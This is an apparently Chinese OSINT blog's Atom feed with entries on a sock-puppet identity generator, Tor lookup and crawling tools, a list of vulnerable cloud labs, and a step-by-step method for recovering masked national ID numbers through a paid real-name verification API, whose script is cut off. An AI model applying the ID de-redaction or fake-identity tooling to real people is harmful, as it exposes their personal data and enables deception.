<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Plague</title>
  <icon>https://www.gravatar.com/avatar/e19ae608b216e280d61993f040b24eab</icon>
  <subtitle>plague的Blog</subtitle>
  <link href="http://example.com/plague.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-11-05T03:57:06.626Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>plague</name>
    <email>plague.3389@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>面向 OSINT 调查人员的自动命令行身份生成工具</title>
    <link href="http://example.com/google/8795b201.html"/>
    <id>http://example.com/google/8795b201.html</id>
    <published>2024-11-05T03:47:22.000Z</published>
    <updated>2024-11-05T03:57:06.626Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Loki框架"><a href="#Loki框架" class="headerlink" title=" Loki框架"></a><a href="https://github.com/malwaredojo/loki"><img src="https://github.com/malwaredojo/loki/raw/main/imgs/loki-logo.png" alt="英特尔盒子"></a> Loki框架</h1><h3 id="面向-OSINT-调查人员的自动命令行身份生成工具"><a href="#面向-OSINT-调查人员的自动命令行身份生成工具" class="headerlink" title="面向 OSINT 调查人员的自动命令行身份生成工具"></a><strong>面向 OSINT 调查人员的自动命令行身份生成工具</strong></h3><p><strong><a href="https://github.com/malwaredojo/loki#installation--usage">安装</a></strong> <strong>•</strong>  <strong><a href="https://github.com/malwaredojo/loki#features">功能</a></strong> <strong>•</strong>  <strong><a href="https://github.com/malwaredojo/loki#contributions--license">贡献</a></strong> <strong>•</strong>  <strong><a href="https://github.com/malwaredojo/loki#future-goals">未来目标</a></strong></p><h1 id="洛基是什么？"><a href="#洛基是什么？" class="headerlink" title="洛基是什么？"></a>洛基是什么？</h1><p><strong>Loki 可以创建一个傀儡身份，您可以使用它来创建虚假的在线状态以开始调查。作为 OSINT、私人或任何其他寻求进行 OSINT 调查的调查员；您需要一个无法追溯到您的傀儡。设置傀儡很容易；只要您知道在哪里寻找。</strong></p><p><strong>Loki 可自动执行此过程，并为您提供创建袜子木偶所需的所有必要细节。Loki 处于开发的初始阶段，随着时间的推移，将添加更多功能。截至 2022 年 10 月 26 日，Loki 不仅能够为您提供详细信息，还能为您提供来自此<a href="https://thispersondoesnotexist.com/">网站</a>的 AI 生成图像。随着项目的继续，将添加更多功能。</strong></p><p><strong>要了解未来目标，<a href="https://github.com/malwaredojo/loki#future-goals">请点击此处</a></strong></p><h1 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h1><p><a href="https://github.com/malwaredojo/loki/blob/main/imgs/loki-screenshot.png"><img src="https://github.com/malwaredojo/loki/raw/main/imgs/loki-screenshot.png" alt="图像"></a></p><h1 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/malwaredojo/loki.git</span><br><span class="line">$ cd loki/</span><br><span class="line">$ pip3 install -r requirements.txt</span><br><span class="line">$ cd loki</span><br><span class="line">$ sudo python3 loki.py</span><br></pre></td></tr></table></figure><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><ul><li>存储在文本文件中的信息</li><li>使用 AI 生成的图像生成信息（此人不存在）</li><li>如果你愿意，可以选择袜子木偶职业</li></ul><h1 id="未来目标"><a href="#未来目标" class="headerlink" title="未来目标"></a>未来目标</h1><p>这是该项目所有未来目标的列表。</p><ul><li>使其独立于发行</li><li>以虚假信息为名自动创建社交媒体账户</li><li>添加性别开关，让框架生成用户希望的信息</li><li>添加根据用户指定的国籍生成信息的功能</li><li>以各种格式（JSON、CSV）保存输出</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="情报" scheme="http://example.com/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="OSINT" scheme="http://example.com/tags/OSINT/"/>
    
    <category term="开源情报" scheme="http://example.com/tags/%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5/"/>
    
    <category term="虚假在线身份" scheme="http://example.com/tags/%E8%99%9A%E5%81%87%E5%9C%A8%E7%BA%BF%E8%BA%AB%E4%BB%BD/"/>
    
    <category term="傀儡" scheme="http://example.com/tags/%E5%82%80%E5%84%A1/"/>
    
  </entry>
  
  <entry>
    <title>onion-lookup：Tor 洋葱网站元数据检索</title>
    <link href="http://example.com/google/bc26ce6b.html"/>
    <id>http://example.com/google/bc26ce6b.html</id>
    <published>2024-11-05T03:34:13.000Z</published>
    <updated>2024-11-05T03:44:21.741Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="onion-lookup：Tor-洋葱网站元数据检索"><a href="#onion-lookup：Tor-洋葱网站元数据检索" class="headerlink" title="onion-lookup：Tor 洋葱网站元数据检索"></a>onion-lookup：Tor 洋葱网站元数据检索</h1><p><a href="https://github.com/ail-project/onion-lookup">Github地址</a></p><p>用于检查 Tor 隐藏服务的存在并检索其相关元数据的软件后端和服务。<br>onion-lookup 依赖于 AIL 实例来获取元数据。<br><img src="/google/bc26ce6b/img.png" alt="img.png"></p><h2 id="onion-lookup-的在线版本"><a href="#onion-lookup-的在线版本" class="headerlink" title="onion-lookup 的在线版本"></a>onion-lookup 的在线版本</h2><p>您可以在以下位置不受限制地在线使用 Onion-Lookup，<br>包括 API：  <a href="https://onion.ail-project.org/%E3%80%82">https://onion.ail-project.org/。</a></p><p>比如我们来监测一下长安不夜城的最近活动<br><img src="/google/bc26ce6b/img.png" alt="img.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="tor" scheme="http://example.com/tags/tor/"/>
    
    <category term="暗网地址查找" scheme="http://example.com/tags/%E6%9A%97%E7%BD%91%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BE/"/>
    
  </entry>
  
  <entry>
    <title>TorCrawl：通过 TOR 网络抓取并提取（常规或洋葱）网页</title>
    <link href="http://example.com/google/389d831b.html"/>
    <id>http://example.com/google/389d831b.html</id>
    <published>2024-11-05T03:18:41.000Z</published>
    <updated>2024-11-05T03:36:19.646Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/google/389d831b/img.png" alt="img.png"></p><h3 id="TorCrawl-py-是一个-Python-脚本，旨在通过-Tor-网络进行匿名网页抓取。"><a href="#TorCrawl-py-是一个-Python-脚本，旨在通过-Tor-网络进行匿名网页抓取。" class="headerlink" title="TorCrawl.py 是一个 Python 脚本，旨在通过 Tor 网络进行匿名网页抓取。"></a>TorCrawl.py 是一个 Python 脚本，旨在通过 Tor 网络进行匿名网页抓取。</h3><p><a href="https://github.com/MikeMeliz/TorCrawl.py">Github链接</a></p><p>它结合了易用性和 Tor 强大的隐私功能，可以实现安全且不可追踪的数据收集。这款工具非常适合新手和经验丰富的程序员，对于数字时代负责任的数据收集至关重要。</p><h3 id="是什么让它变得简单且易于使用？"><a href="#是什么让它变得简单且易于使用？" class="headerlink" title="是什么让它变得简单且易于使用？"></a>是什么让它变得简单且易于使用？</h3><p>如果你是一个终端狂人，你就会知道事情必须简单明了。将输出传递到其他工具是必要的，准确性是关键。</p><p>只需一个参数，您就可以通过 TOR 网络读取 .onion 网页或常规网页，并且通过使用管道，您可以将输出传递到您喜欢的任何其他工具。</p><p><code>$ torcrawl -u http://www.github.com/ | grep &#39;google-analytics&#39; &lt;meta-name=&quot;google-analytics&quot; content=&quot;UA-XXXXXX- &quot;&gt;</code></p><p>如果您想抓取网页的链接，请使用 <strong>BAM</strong><code>-c</code> 并 在文件上获取所有内部链接。您甚至可以使用 它们来抓取它们等等。您还可以使用参数 在下一次抓取之前等待几秒钟。<code>-d``-p</code></p><p><code>$ torcrawl -v -u http://www.github.com/ -c -d 2 -p 2 \# TOR 已准备就绪！ \# URL：http://www.github.com/ \# 您的 IP：XXX.XXX.XXX.XXX \# 爬虫程序从 http://www.github.com/ 开始，深度爬取 2 次，延迟 2 秒： \# 步骤 1 完成，结果为：11 个 \# 步骤 2 完成，结果为：112 个 \# 文件创建于 /path/to/project/links.txt</code></p><p>提示</p><p>抓取并不违法，但侵犯版权 <em>是</em>违法的。在开始抓取网站之前，最好仔细检查网站的条款和条件。有些网站设置了所谓的“ <code>robots.txt</code> 阻止抓取工具访问这些页面”的规则。<br>此抓取工具 <em>可</em> 让您绕过此规则，但我们始终 <em>建议</em> 尊重 robots.txt。</p><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="使用-pip-轻松安装："><a href="#使用-pip-轻松安装：" class="headerlink" title="使用 pip 轻松安装："></a>使用 pip 轻松安装：</h3><p><em>即将推出..</em></p><h3 id="手动安装："><a href="#手动安装：" class="headerlink" title="手动安装："></a>手动安装：</h3><ol><li><p><strong>克隆此存储库</strong>：<br><code>git clone https://github.com/MikeMeliz/TorCrawl.py.git</code></p></li><li><p><strong>安装依赖项</strong>：<br><code>pip install -r requirements.txt</code></p></li><li><p>安装并启动 TOR 服务</p><p>：</p><ol><li><strong>Debian &#x2F; Ubuntu</strong>：<br><code>apt-get install torservice tor start</code></li><li><strong>Windows</strong>：下载 <a href="https://www.torproject.org/download/tor/"><code>tor.exe</code></a>，然后：<br><code>tor.exe --service installtor.exe --service start</code></li><li><strong>MacOS</strong>：<br><code>brew install torbrew services start tor</code></li><li>对于不同的发行版，请访问：<br><a href="https://www.torproject.org/docs/">TOR 设置文档</a></li></ol></li></ol><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><table><thead><tr><th align="left"><strong>命令</strong></th><th align="left"><strong>长命令</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left"><strong>一般的</strong>：</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">-h</td><td align="left">–help</td><td align="left">帮助信息</td></tr><tr><td align="left">-v</td><td align="left">–verbose</td><td align="left">显示更多有关进度的信息</td></tr><tr><td align="left">-u</td><td align="left">–url *.onion</td><td align="left">要抓取或提取的网页 URL</td></tr><tr><td align="left">-w</td><td align="left">–without</td><td align="left">不使用 TOR 网络</td></tr><tr><td align="left">-f</td><td align="left">–folder</td><td align="left">包含生成文件的目录</td></tr><tr><td align="left"><strong>提取</strong>：</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">-e</td><td align="left">–extract</td><td align="left">将页面代码提取到终端或文件（默认：终端）</td></tr><tr><td align="left">-i</td><td align="left">–input filename</td><td align="left">输入文件及 URL（以行分隔）</td></tr><tr><td align="left">-o</td><td align="left">–output [filename]</td><td align="left">将页面输出至文件（一页）</td></tr><tr><td align="left">-y</td><td align="left">–yara</td><td align="left">执行 yara 关键字搜索： h &#x3D; 搜索整个 html 对象， t &#x3D; 仅搜索文本</td></tr><tr><td align="left"><strong>抓取</strong>：</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">-c</td><td align="left">–crawl</td><td align="left">抓取网站 (默认输出在 website&#x2F;links.txt)</td></tr><tr><td align="left">-d</td><td align="left">–cdepth</td><td align="left">设置爬行器行进的深度（默认值：1）</td></tr><tr><td align="left">-p</td><td align="left">–pause</td><td align="left">请求之间的暂停秒数（默认值：0）</td></tr><tr><td align="left">-l</td><td align="left">–log</td><td align="left">包含访问过的 URL 及其响应代码的日志文件</td></tr></tbody></table><h2 id="用法和示例"><a href="#用法和示例" class="headerlink" title="用法和示例"></a>用法和示例</h2><h3 id="作为提取器："><a href="#作为提取器：" class="headerlink" title="作为提取器："></a>作为提取器：</h3><p>只需将单个网页提取到终端：</p><p><code>$ python torcrawl.py -u http://www.github.com</code></p><p>无需使用 TOR 即可提取到文件（github.htm）：</p><p><code>$ python torcrawl.py -w -u http://www.github.com -o github.htm</code><br>## 在 &#x2F;script&#x2F;path&#x2F;github.htm 创建文件</p><p>解压到终端，只找到包含 google-analytics 的行：</p><p><code>$ python torcrawl.py -u http://www.github.com | grep &#39;google-analytics&#39;</code><br> <code>&lt;meta name=&quot;google-analytics&quot; content=&quot;UA-*******-*&quot;&gt;</code></p><p>提取到文件并使用 yara 仅找到包含 google-analytics 的行：</p><p><code>$ python torcrawl.py -v -w -u https://github.com -e -y 0</code><br>…</p><p>*<strong>注意：*</strong> 更新 res&#x2F;keyword.yar 以搜索其他关键字。 <code>-y 0</code> 用于原始 html 搜索和 <code>-y 1</code> 文本搜索。</p><p>提取一组网页（从文件导入）到终端：</p><p><code>$ python torcrawl.py -i links.txt</code><br>…</p><h3 id="作为爬虫："><a href="#作为爬虫：" class="headerlink" title="作为爬虫："></a>作为爬虫：</h3><p>无需使用 TOR 即可抓取网页链接，并显示详细输出（非常有用）：</p><p><code>$ python torcrawl.py -v -w -u http://www.github.com/ -c</code><br>## URL: <a href="http://www.github.com/">http://www.github.com/</a><br>## 您的 IP: <em>.</em>.<em>.</em><br>## 爬虫程序从 <a href="http://www.github.com/">http://www.github.com/</a> 开始执行步骤 1 并等待 0<br>## 步骤 1 完成，结果为：11<br>## 文件创建于 &#x2F;script&#x2F;path&#x2F;links.txt</p><p>以深度 2（2 次点击）爬取网页，并等待 5 秒再爬取下一页：</p><p><code>$ python torcrawl.py -v -u http://www.github.com/ -c -d 2 -p 5</code><br>## TOR 已准备就绪！<br>## URL：<a href="http://www.github.com/">http://www.github.com/</a><br>## 您的 IP：*.<em>.</em>.*<br>## 爬虫程序从 <a href="http://www.github.com/">http://www.github.com</a> 开始执行第 2 步并等待 5<br>## 第 1 步完成，得到 11 个结果<br>## 第 2 步完成，得到 112 个结果<br>## 文件已在 &#x2F;script&#x2F;path&#x2F;links.txt 上创建</p><h3 id="作为两者："><a href="#作为两者：" class="headerlink" title="作为两者："></a>作为两者：</h3><p>您可以使用单个命令抓取页面并将网页提取到文件夹中：</p><p><code>$ python torcrawl.py -v -u http://www.github.com/ -c -d 2 -p 5 -e</code><br>## TOR 已准备就绪！<br>## URL：<a href="http://www.github.com/">http://www.github.com/</a><br>## 您的 IP：*.<em>.</em>.*<br>## 爬虫程序从 <a href="http://www.github.com/">http://www.github.com</a> 开始执行步骤 1，等待 5<br>## 步骤 1 完成，结果为：11<br>## 文件创建于 &#x2F;script&#x2F;path&#x2F;FolderName&#x2F;index.htm<br>## 文件创建于 &#x2F;script&#x2F;path&#x2F;FolderName&#x2F;projects.html<br>## …</p><p><em><strong>注意：</strong></em> <em>爬虫链接的默认（目前唯一）文件是 <code>links.txt</code> 文档。此外，要在爬取后立即提取，您必须提供 <code>-e</code> 参数</em></p><p>遵循相同的逻辑；您可以将所有这些页面解析为 grep（例如）并搜索特定文本：</p><p><code>$ python torcrawl.py -u http://www.github.com/ -c -e | grep &#39;&lt;/html&gt;&#39;</code></p>...<h3 id="两者-关键字搜索："><a href="#两者-关键字搜索：" class="headerlink" title="两者 + 关键字搜索："></a>两者 + 关键字搜索：</h3><p>您可以使用单个命令抓取页面、执行关键字搜索并将与结果匹配的网页提取到文件夹中：</p><p><code>$ python torcrawl.py -v -u http://www.github.com/ -c -d 2 -p 5 -e -yh</code><br>## TOR 已准备就绪！<br>## URL：<a href="http://www.github.com/">http://www.github.com/</a><br>## 您的 IP：*.<em>.</em>.*<br>## 爬虫程序从 <a href="http://www.github.com/">http://www.github.com</a> 开始执行步骤 1，等待 5<br>## 步骤 1 完成，结果为：11<br>## 文件创建于 &#x2F;script&#x2F;path&#x2F;FolderName&#x2F;index.htm<br>## 文件创建于 &#x2F;script&#x2F;path&#x2F;FolderName&#x2F;projects.html<br>## …</p><p><em><strong>注意：</strong></em> <em>更新 res&#x2F;keyword.yar 以搜索其他关键字。 仅<code>-y h</code> 用于原始 html 搜索和 <code>-y t</code> 文本搜索。</em></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><a href="https://darkwebinformer.com/content/images/2024/10/8732872532.gif"><img src="https://darkwebinformer.com/content/images/2024/10/8732872532.gif" alt="img"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="tor" scheme="http://example.com/tags/tor/"/>
    
  </entry>
  
  <entry>
    <title>云靶场</title>
    <link href="http://example.com/google/f6f746cc.html"/>
    <id>http://example.com/google/f6f746cc.html</id>
    <published>2024-10-11T09:40:28.000Z</published>
    <updated>2024-10-11T09:41:34.676Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://github.com/iknowjason/Awesome-CloudSec-Labs">https://github.com/iknowjason/Awesome-CloudSec-Labs</a></p><h2 id="acygl">AWS</h2>[CloudFoxable](https://github.com/BishopFox/cloudfoxable)：通过设计 AWS 渗透测试平台创建您自己的漏洞。<p><a href="https://bigiamchallenge.com/">IAM 重大挑战</a>：识别和利用 IAM 错误配置的 CTF 挑战。</p><p><a href="https://github.com/doyensec/cloudsec-tidbits/">CloudSec 花絮</a>：三个特定于 AWS 云的 Web 应用程序安全缺陷，由 terraform 自托管。</p><p><a href="https://pentesting.cloud/">Pentesting.Cloud：17</a>个免费实验室。需要网站注册。</p><p><a href="https://aws.amazon.com/blogs/security/aws-cirt-announces-the-release-of-five-publicly-available-workshops/">AWS CIRT 研讨会</a>：在您自己的 AWS 账户中构建并探索 AWS CIRT 团队所见的 5 种常见事件响应场景。</p><p><a href="https://github.com/RhinoSecurityLabs/cloudgoat">CloudGoat</a>：设计上易受攻击的 AWS 安全实验室，提供指导演练。</p><p><a href="https://attack-defend-serverless.sanscloudwars.com/">攻击和防御无服务器应用程序</a>：攻击和防御您使用作者提供的 terraform 和脚本在自己的 AWS 账户中构建的 Lambda。非常具有教育意义，具有研讨会风格的感觉。</p><p><a href="https://github.com/BishopFox/iam-vulnerable">IAM 漏洞</a>：使用 Terraform 通过设计具有 31 种权限升级攻击路径的 AWS IAM 权限升级游乐场来创建您自己的漏洞。非常可靠的文档。</p><p><a href="http://flaws.cloud/">缺陷.云</a>：用关卡和线索挑战风格。</p><p><a href="http://flaws2.cloud/">缺陷2.cloud</a>：具有攻击者和防御者路径的挑战风格。</p><p><a href="https://hackingthe.cloud/aws/capture_the_flag/cicdont/">CI&#x2F;CDon’t</a>：使用 terraform 在您的 aws 账户中托管的易受攻击的 CI&#x2F;CD CTF 挑战。包括演练。</p><p><a href="http://https//github.com/ine-labs/AWSGoat">AWSGoat</a>：一个非常脆弱的AWS基础设施，有两本攻击和防御手册。</p><p><a href="https://github.com/nccgroup/sadcloud">Sadcloud</a>：在没有显示漏洞的指南的情况下创建易受攻击的 AWS 服务。</p><p><a href="https://github.com/m6a-UdS/dvca">DVCA</a>：在您自己的 AWS 帐户中部署一个该死的易受攻击的云应用程序来练习权限升级。</p><p><a href="https://github.com/wickett/lambhack">lamhack</a>：在您的 AWS 账户中部署一个非常容易受到攻击的 AWS lambda 无服务器应用程序。</p><h2 id="VCAlZ">天蓝色</h2>[损坏的 Azure](https://www.brokenazure.cloud/)：Azure 基础设施在设计上存在漏洞，您可以对其进行攻击。<p><a href="https://lab.purplecloud.network/">PurpleCloud Azure AD 研讨会</a>：模拟企业 Azure 客户的引导漏洞研讨会。它需要 PurpleCloud 和 terraform；用户名和密码是sec588</p><p><a href="https://github.com/mandiant/Azure_Workshop">Mandiant Azure Workshop</a>：设计上存在漏洞的 Azure 实验室，包含您在自己的 Azure 租户中构建的两个场景。</p><p><a href="https://github.com/ine-labs/AzureGoat">AzureGoat</a>：使用 terraform 构建一个模块并浏览所提供的攻击和防御手册。</p><p><a href="https://github.com/XMCyber/XMGoat">XMGoat</a>：在 Azure 租户中构建 5 个场景并浏览提供的解决方案文档。</p><p><a href="https://github.com/Azure/CONVEX">CONVEX</a>：使用 powershell 在 Azure 租户中启动三个 Capture the Flag 环境。</p><h2 id="Cvaha">GCP</h2>[GCP Goat (Josh Jebaraj)](https://gcpgoat.joshuajebaraj.com/index.html)：托管在您自己的 GCP 帐户中并使用提供的脚本进行构建。它有一本很好的指导实验室工作簿。<p><a href="https://github.com/ine-labs/GCPGoat">GCPGoat (ine-labs)</a>：带上您自己的 GCP 帐户并使用 terraform 构建一个模块。提供攻击和防御手册。</p><p><a href="https://thunder-ctf.cloud/">迅雷CTF</a>：自带GCP账号，6级，练习攻击GCP上的易受攻击的云项目。</p><h2 id="EuTFb">库伯内斯</h2>[Bustakube](https://www.bustakube.com/)：将易受攻击的 K8S 集群下载为 VM，您可以在 VMWare 中导入并本地运行。<p><a href="https://github.com/madhuakula/kubernetes-goat">Kubernetes Goat</a>：在您自己的云帐户（GKE、EKS、AKS）或 K3S 中创建并托管并进行攻击。包括指导工作簿。</p><p><a href="https://securekubernetes.com/">Kubecon NA 2019 CTF</a>：您在 GCP 帐户中创建的很棒的 CTF。有一本指导工作簿，其中包含两种攻击和防御场景以及奖励挑战。</p><h2 id="e1CQH">容器</h2>[Container Security 101](https://jonzeolla.com/labs/container-security-101.html)：在您的 AWS 账户中托管的指导性漏洞研讨会。作者在网页上提供了一个很好的实验，您可以使用 CloudFormation 构建一个虚拟机，然后创建一个容器。<p><a href="https://contained.af/">Contained.af</a>：容器逃逸挑战，突破它并向作者发送电子邮件。</p><h2 id="VIR7J">地形</h2>[TerraGoat](https://github.com/bridgecrewio/terragoat)：Terraform 存储库设计上存在漏洞。<h2 id="dWNLd">研究实验室</h2>[PurpleCloud](https://www.purplecloud.network/)：使用 python 和 terraform，构建您自己的 Azure 安全实验室。<p><a href="https://github.com/Azure/SimuLand">SimuLand</a>：使用 Azure RM 模板，创建您自己的 Azure 安全实验室。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="云攻防" scheme="http://example.com/categories/%E4%BA%91%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="云攻防" scheme="http://example.com/tags/%E4%BA%91%E6%94%BB%E9%98%B2/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>仙术：脱敏信息恢复</title>
    <link href="http://example.com/google/6fc2080f.html"/>
    <id>http://example.com/google/6fc2080f.html</id>
    <published>2024-10-11T09:15:35.000Z</published>
    <updated>2024-10-11T09:21:48.267Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SVAnN">整体思路：</h1>身份证等是有校验位和校验规则的，所以可以本地进行枚举，然后校验格式正确后调用付费的接口进行check<p>手机号一般打码在4-6位，</p><p>主要依托于腾讯云的相关接口</p><p><a href="https://console.cloud.tencent.com/faceid/access">https://console.cloud.tencent.com/faceid/access</a></p><h1 id="YuWCM">身份证恢复</h1>成本一个人中间6位缺失，需要3-6元<h2 id="exjRF">脚本执行流程</h2>1. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">导入所需的库和模块。</font>2. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">设置腾讯云API密钥。</font>3. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义get_checkbit()函数，用于本地计算身份证号码的校验位。</font>4. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义check_number()函数，用于本地检查身份证号码是否合法。</font>5. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义is_valid_id_number()函数，用于调用腾讯云API验证身份证号码和姓名是否匹配。</font>6. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义generate_id_numbers()函数，用于根据部分身份证号码生成可能的完整身份证号码列表。</font>7. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义read_excel()函数，用于从Excel文件中读取姓名和部分身份证号码数据。</font>8. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义write_excel()函数，用于将结果写入Excel文件。</font>9. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义process_id_number()函数，用于处理单个姓名和部分身份证号码，查找匹配的完整身份证号码。</font>10. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">定义main()函数，用于处理整个流程： a. 从输入的Excel文件中读取数据。 b. 为每个姓名和部分身份证号码创建一个线程，调用process_id_number()函数处理。 c. 等待所有线程完成。 d. 打印请求接口的总次数和成功匹配的结果。 e. 将结果写入Excel文件。</font>11. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">解析命令行参数，获取输入Excel文件的路径。</font>12. <font style="color:rgb(55, 65, 81);background-color:rgb(249, 250, 251);">调用main()函数，开始执行程序。</font><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 